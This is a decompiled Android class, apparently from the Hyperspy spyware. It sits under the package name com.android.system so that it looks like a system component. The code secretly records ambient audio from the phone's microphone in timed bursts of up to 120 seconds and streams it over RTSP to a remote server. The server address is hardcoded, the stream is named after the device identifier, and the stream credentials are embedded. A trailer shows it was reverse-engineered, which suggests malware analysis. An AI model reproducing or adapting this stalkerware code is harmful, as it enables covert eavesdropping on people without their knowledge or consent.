package com.android.system;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import com.app.system.common.h;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AmbientService
  extends Service
{
  public int a = 0;
  private com.app.system.streaming.g.a b;
  private com.app.system.streaming.b c;
  
  public void a()
  {
    final Timer localTimer = new Timer();
    localTimer.scheduleAtFixedRate(new TimerTask()
    {
      public void run()
      {
        if (!AmbientService.this.getApplicationContext().getSharedPreferences("pref", 0).getBoolean("ambient-record-active", false))
        {
          localTimer.cancel();
          if (h.f(AmbientService.this.getApplicationContext())) {
            AmbientService.this.c();
          }
        }
        else if (com.app.system.common.b.b(AmbientService.this.getApplicationContext()))
        {
          Object localObject = AmbientService.this;
          ((AmbientService)localObject).a += 1;
          localObject = new StringBuilder();
          ((StringBuilder)localObject).append("timeStampAmbient: ");
          ((StringBuilder)localObject).append(AmbientService.this.a);
          com.security.d.a.d("AmbientService", ((StringBuilder)localObject).toString(), new Object[0]);
          if (AmbientService.this.a >= 120)
          {
            localTimer.cancel();
            if (h.f(AmbientService.this.getApplicationContext())) {
              AmbientService.this.c();
            }
          }
        }
        else
        {
          localTimer.cancel();
          if (h.f(AmbientService.this.getApplicationContext())) {
            AmbientService.this.c();
          }
        }
      }
    }, 0L, 1000L);
  }
  
  public void b()
  {
    com.security.d.a.d("AmbientService", "Start ambient", new Object[0]);
    if (this.c == null) {
      this.c = com.app.system.streaming.c.a().a(getApplicationContext()).a(5).a(new com.app.system.streaming.a.c(8000, 16000)).e(0).b();
    }
    if (this.b == null)
    {
      this.b = new com.app.system.streaming.g.a();
      this.b.a(this.c);
    }
    d();
  }
  
  public void c()
  {
    com.app.system.streaming.g.a locala = this.b;
    if (locala != null) {
      locala.c();
    }
    if (this.c != null) {
      stopSelf();
    } else {
      stopSelf();
    }
  }
  
  public void d()
  {
    if (this.b.a())
    {
      this.b.c();
      return;
    }
    Object localObject1 = Pattern.compile("rtsp://(.+):(\\d*)/(.+)");
    Object localObject2 = new StringBuilder();
    ((StringBuilder)localObject2).append("rtsp://192.168.1.191:1935/live/");
    ((StringBuilder)localObject2).append(h.c(this));
    ((StringBuilder)localObject2).append(".mp4");
    localObject2 = ((Pattern)localObject1).matcher(((StringBuilder)localObject2).toString());
    ((Matcher)localObject2).find();
    localObject1 = ((Matcher)localObject2).group(1);
    Object localObject3 = ((Matcher)localObject2).group(2);
    localObject2 = ((Matcher)localObject2).group(3);
    this.b.a("hyperspy", "Aspplusn1");
    this.b.a((String)localObject1, Integer.parseInt((String)localObject3));
    localObject1 = this.b;
    localObject3 = new StringBuilder();
    ((StringBuilder)localObject3).append("/");
    ((StringBuilder)localObject3).append((String)localObject2);
    ((com.app.system.streaming.g.a)localObject1).a(((StringBuilder)localObject3).toString());
    this.b.b();
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    try
    {
      Thread localThread = new java/lang/Thread;
      a locala = new com/android/system/AmbientService$a;
      locala.<init>(this);
      localThread.<init>(locala);
      localThread.start();
    }
    catch (Exception localException)
    {
      com.security.d.a.d("AmbientService", localException.getMessage(), new Object[0]);
    }
  }
  
  public void onDestroy()
  {
    try
    {
      c();
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public void onLowMemory() {}
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  class a
    implements Runnable
  {
    a() {}
    
    public void run()
    {
      try
      {
        AmbientService.this.b();
        AmbientService.this.a = 0;
        AmbientService.this.a();
        return;
      }
      catch (Exception localException)
      {
        for (;;) {}
      }
    }
  }
}


/* Location:              ~/com/android/system/AmbientService.class
 *
 * Reversed by:           J
 */